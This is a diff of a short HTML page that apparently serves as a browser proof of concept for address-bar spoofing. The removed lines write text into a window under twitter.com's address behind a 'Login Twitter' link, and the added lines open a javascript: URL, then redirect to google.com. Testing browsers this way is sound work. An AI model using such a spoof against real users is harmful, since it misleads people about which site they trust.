@@ -1,15 +1,16 @@
 
-<script>
-  function next() {
-         w.location.replace('https://www.google.com:1232');
-        }
 
-  function f() {
-    w = window.open("");
-    w.document.write('<h2>This is not twitter.com!</h2>');
-    w.location = "https://twitter.com";
-    i = setInterval("try { x = w.location.href; } catch(e) { clearInterval(i); next(); }", 1); 
-  }
+
+<body>
+  <script>
+          
+
+
+    
+         function start() {
+var x = window.open('javascript:document.write(1)');
+           setTimeout(function(){x.location='https://www.google.com'}, 4000);
+
+         };
 </script>
-
-<a href="#" onclick="f()">Login Twitter</a>
+<input onclick="start()" value="click here" type="button" /></body>
